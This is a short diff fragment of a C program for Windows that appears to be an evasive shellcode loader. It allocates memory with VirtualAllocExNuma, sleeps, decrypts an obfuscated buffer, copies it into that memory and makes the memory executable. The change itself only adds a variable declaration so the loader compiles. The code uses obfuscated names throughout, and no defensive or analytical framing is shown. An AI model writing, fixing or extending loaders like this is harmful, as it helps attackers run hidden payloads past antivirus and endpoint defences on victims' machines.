@@ -54,6 +54,7 @@ int main() {
 
     LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     Sleep(1000);
+    DWORD oldProtect;
     thisisthkhal((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));  
 memcpy(coohsllo, karic0d2, sizeof(karic0d2));  
     VirtualProtect(coohsllo, sizeof(karic0d2), PAGE_EXECUTE_READ, &oldProtect); 
